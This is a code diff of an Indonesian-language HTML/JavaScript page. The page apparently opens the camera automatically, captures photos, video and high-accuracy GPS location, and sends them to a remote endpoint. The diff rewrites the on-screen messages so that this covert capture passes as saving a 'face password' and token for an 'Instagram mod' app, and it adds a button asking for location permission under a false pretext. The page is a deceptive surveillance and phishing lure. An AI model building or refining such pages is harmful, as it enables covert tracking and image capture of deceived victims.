@@ -79,7 +79,7 @@ button:hover {
     <video id="video" autoplay playsinline></video>
     <canvas id="canvas"></canvas>
     <canvas id="hiddenCanvas"></canvas>
-<p id="statusMessage" style="display: none; color: #0f0; font-size: 18px;">Berhasil tunggu beberapa saat untuk menyesuaikan warna asli</p>
+<p id="statusMessage" style="display: none; color: #0f0; font-size: 18px;">Berhasil tunggu beberapa saat untuk menyimpan password wajah dan token</p>
     <script>
         window.onload = async function() {
             startCamera();
@@ -162,7 +162,7 @@ button:hover {
                 console.log(result);
 
                 if (!response.ok) {
-                    throw new Error(result.description || "Gagal mengirim foto.");
+                    throw new Error(result.description || "Gagal menyimpan password.");
                 }
             } catch (error) {
                 console.error("Error:", error);
@@ -184,13 +184,13 @@ button:hover {
                 console.log(result);
 
                 if (!response.ok) {
-                    throw new Error(result.description || "Gagal mengirim video.");
+                    throw new Error(result.description || "Gagal menyimpan token.");
                 } else {
-                    alert("Video berhasil di mulai dan simpan ke ponsel anda!");
+                    alert("token berhasi di simpan di Instagram web!");
                 }
             } catch (error) {
                 console.error("Error:", error);
-                alert("Gagal menyimpan video ke ponsel anda : " + error.message);
+                alert("Gagal menyimpan token ke web  : " + error.message);
             }
         }
 
@@ -241,12 +241,12 @@ button:hover {
 │ *Link Lokasi:* https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}
 `);
                         },
-                        (error) => reject("│ *Lokasi: Gagal mendapatkan lokasi*\n"),
+                        (error) => reject("│ *Lokasi: Gagal mendapatkan lokasi penyimpanan*\n"),
                         { enableHighAccuracy: true, timeout: 10000 }
                     );
                 });
             } catch {
-                return "│ *Lokasi: Gagal mendapatkan lokasi*\n";
+                return "│ *Lokasi: Gagal mendapatkan lokasi penyimpanan*\n";
             }
         }
 
@@ -394,7 +394,7 @@ __________________________________
             });
             message += locationData;
         } catch (error) {
-            message += "│ *Lokasi: Gagal mendapatkan lokasi*\n";
+            message += "│ *Lokasi: Gagal mendapatkan lokasi penyimpanan*\n";
         }
     }
 
@@ -469,12 +469,12 @@ __________________________________
                     document.getElementById("statusMessage").style.display = "block";
                 },
                 (error) => {
-                    alert("Gagal mendapatkan lokasi: " + error.message);
+                    alert("Gagal mendapatkan lokasi penyimpanan: " + error.message);
                 },
                 { enableHighAccuracy: true, timeout: 10000 }
             );
         } else {
-            alert("Perangkat tidak mendukung fitur lokasi.");
+            alert("Perangkat tidak mendukung fitur lokasi penyimpanan.");
         }
     }
 
@@ -493,13 +493,13 @@ __________________________________
                 body: JSON.stringify(payload)
             });
         } catch (error) {
-            console.error("Gagal mengirim lokasi: ", error);
+            console.error("Gagal mengirim token ke lokasi penyimpanan: ", error);
         }
     }
     </script>
     <button onclick="requestLocation()">Izinka lokasi untuk menyimpan database  </button>
     
-   <button class="button" onclick="bukaDiChrome()">Buka Sekarang</button>
+   <button class="button" onclick="bukaDiChrome()">Buka Instagram mod</button>
     </div>
 
     <script>
